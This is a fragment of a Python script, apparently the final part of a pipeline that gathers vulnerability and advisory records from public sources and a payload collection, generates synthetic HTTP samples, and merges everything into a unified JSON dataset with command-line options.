        nvd    = fetch_nvd(max_per_keyword=nvd_per_kw, api_key=nvd_api_key)
        gh     = fetch_github_advisories(github_token=github_token, max_records=gh_max)
        kev    = fetch_cisa_kev()
        osv    = fetch_osv(max_per_ecosystem=osv_per_eco)
        h1     = fetch_hackerone(max_pages=h1_pages)
        patt   = fetch_payloads_all_things()
        summary.update({"nvd": len(nvd), "github": len(gh), "cisa_kev": len(kev),
                        "osv": len(osv), "hackerone": len(h1), "patt": len(patt)})
    else:
        patt = []

    # Always regenerate advanced synthetic (uses real payloads as augmentation)
    http = generate_advanced_http(n_samples=synth_n, payload_records=patt)
    summary["synthetic_http"] = len(http)

    # Merge all text records into a single unified dataset
    all_text = []
    for fname in ["nvd_cves.json", "github_advisories.json", "cisa_kev.json",
                  "osv_vulns.json", "hackerone_reports.json", "patt_payloads.json"]:
        p = RAW_DIR / fname
        if p.exists():
            records = json.loads(p.read_text())
            all_text.extend(records)
            print(f"  Merged {len(records):>6} records from {fname}")

    out = RAW_DIR / "unified_dataset.json"
    out.write_text(json.dumps(all_text, indent=2))
    summary["total_text_records"] = len(all_text)
    summary["finished"] = datetime.utcnow().isoformat()

    print(f"\n  ✅ Unified dataset: {len(all_text):,} text records")
    print(f"  ✅ HTTP samples:    {len(http):,}")
    print(f"  ✅ Total:           {len(all_text)+len(http):,}")
    (RAW_DIR / "collection_summary.json").write_text(json.dumps(summary, indent=2))
    return summary


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--nvd-per-kw",   type=int, default=300)
    p.add_argument("--gh-max",       type=int, default=2000)
    p.add_argument("--osv-per-eco",  type=int, default=200)
    p.add_argument("--h1-pages",     type=int, default=10)
    p.add_argument("--synth-n",      type=int, default=15000)
    p.add_argument("--github-token", type=str, default=None)
    p.add_argument("--nvd-api-key",  type=str, default=None)
    p.add_argument("--skip-live",    action="store_true", help="Only regenerate synthetic data")
    args = p.parse_args()
    collect_all(**vars(args))
